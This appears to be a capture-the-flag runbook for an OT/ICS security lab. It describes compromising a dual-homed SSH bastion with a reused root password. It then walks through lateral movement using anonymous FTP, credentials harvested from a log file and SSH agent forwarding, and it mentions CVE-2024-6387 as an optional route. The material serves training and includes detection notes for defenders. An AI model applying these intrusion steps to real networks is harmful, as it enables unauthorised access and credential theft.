# Runbook: SSH bastion compromise and enterprise pivot

The SSH bastion at the IT/OT boundary has `PermitRootLogin yes` and a password
that the same team also used on the Neuron gateway. A root shell on the bastion
gives a foothold on the enterprise network via the second NIC, which the network
inventory does not mention. The regreSSHion vulnerability (CVE-2024-6387) is
also present for those who prefer a race condition to a dictionary entry.

- Techniques: 
  - [Credential attacks and authentication abuse](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#credential-attacks-and-authentication-abuse)
  - [Trust exploitation and misconfiguration](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#trust-exploitation-and-misconfiguration-abuse)
  - [IT/OT boundary crossing](https://purple.tymyrddin.dev/docs/ctfs/ot-ics/attack-surface#initial-access-and-lateral-movement-through-the-it-ot-boundary)
- Challenge type: Realist
- Difficulty: Intermediate

## Components to start

```bash
./ctl up
sudo ./ctl firewall
```

Minimal containers: `unseen-gate`, `contractors-gate`

For enterprise lateral movement after obtaining the root shell, also bring up
`hex-legacy-1` and `bursar-desk`. The firewall is required; it enforces that only
`contractors-gate` can bridge from the DMZ into the enterprise zone.

Entry point: `unseen-gate` (10.10.0.5). The internet zone has a direct route
to `contractors-gate` (10.10.5.20, SSH port 22).

## Background

`contractors-gate` is `debian:12.0` with `openssh-server 9.2p1-2`. It is
dual-homed: internet-facing on `ics_dmz` (10.10.5.20) and enterprise-facing on
`ics_enterprise` (10.10.1.30). The enterprise NIC address does not appear in
any documentation in the enterprise zone, but a full subnet scan reveals it.

The primary route in is the root credential `uupl2015`, which is reused from
the Neuron gateway (`sorting-office:7000`). The bastion was intended as an
access control point; having a password that also unlocks an industrial protocol
gateway in the same DMZ somewhat defeats the purpose.

`AllowAgentForwarding yes` means that an attacker who connects with `-A` can
use a forwarded SSH agent to authenticate onwards to enterprise hosts, without
needing any private key on the bastion.

## Attack path

### Stage 1: confirm the target

```bash
# From unseen-gate
nmap -sV 10.10.5.20
# 22/tcp open  ssh  OpenSSH 9.2p1 (protocol 2.0)

# Banner grab
ssh -o "BatchMode=yes" root@10.10.5.20 2>&1 | head
# SSH-2.0-OpenSSH_9.2p1 Debian-2
```

### Stage 2: login with the root credential

```bash
# Primary path: one command, no tooling required
ssh root@10.10.5.20
# Password: uupl2015

# Confirm dual-home status
ip addr
# eth0: 10.10.5.20/24  (DMZ)
# eth1: 10.10.1.30/24  (enterprise)

# The enterprise NIC is not documented in the enterprise zone inventory
# A network scan from here finds 10.10.1.10, 10.10.1.20, 10.10.1.3
```

### Stage 3: enterprise zone lateral movement

```bash
# From the bastion, the entire enterprise segment is reachable
nmap -sV 10.10.1.0/24
# 10.10.1.10: 21/ftp  22/ssh  23/telnet  139,445/smb
# 10.10.1.20: 22/ssh

# Anonymous FTP on hex-legacy-1 gives full credentials
ftp 10.10.1.10
> Name: anonymous
> cd UUPL
> get NETWORK.TXT
> cd ../LOGBOOK
> get ENGINEER.LOG
# ENGINEER.LOG contains bursardesk/Octavo1, engineer/spanner99, hist_admin/Historian2015

# SSH to bursar-desk
ssh bursardesk@10.10.1.20
# Password: Octavo1

# From bursar-desk: operational NIC at 10.10.2.100
# historian at 10.10.2.10, SCADA at 10.10.2.20, eng-ws at 10.10.2.30 are all reachable
```

### Stage 4: agent forwarding pivot

```bash
# If the attacker already holds an SSH key trusted by a downstream host
# (e.g. the uupl_eng_key collected from wizzards-retreat):
# Load it into the local agent before connecting

eval $(ssh-agent)
ssh-add uupl_eng_key

# Connect to the bastion with forwarding enabled
ssh -A root@10.10.5.20

# From the bastion, authenticate to the engineering workstation using the
# forwarded agent: the key never touches the bastion
ssh engineer@10.10.2.30
# Accepted via forwarded agent
```

### Stage 5: regreSSHion (CVE-2024-6387), optional

```bash
# The vulnerability is a signal handler race condition in OpenSSH < 9.2p1-2+deb12u3
# Exploitation is timing-dependent and probabilistic; the credential path above
# is faster and more reliable

# Public PoC tools (available since July 2024) automate the timing attack
# Requires multiple concurrent connection attempts targeting the race window
# Success gives unauthenticated root code execution on glibc-based Linux

# Confirm vulnerable version:
ssh -o "BatchMode=yes" root@10.10.5.20 2>&1 | grep -i openssh
# OpenSSH 9.2p1 Debian-2, confirmed affected
```

## Note on logging

`rsyslog` inside the container forwards all sshd authentication events to
`scribes-post` (10.10.5.32) on UDP 514 without TLS. A blue team analyst
watching the syslog relay sees every login attempt, including the successful
root login and any agent-forwarded sessions. Worth knowing if the exercise
includes a detection component.

## Flag placement

Place the flag at `/root/flag.txt` on the bastion. The participant reads it
after obtaining the root shell.

For a harder variant, embed the flag in a file on `hex-legacy-1` that requires
the FTP anonymous access to retrieve, making the bastion compromise the pivot
rather than the objective.

## What this is really about

A bastion host is the one machine that everything remote touches. It is also
frequently the machine where the security team's attention stops, because it
looks secure from the outside: one port, strong network controls. The inside
tells a different story. `PermitRootLogin yes` is a configuration item that
takes about two seconds to change. The password reuse requires slightly more
coordination. Neither was changed. This is not unusual.
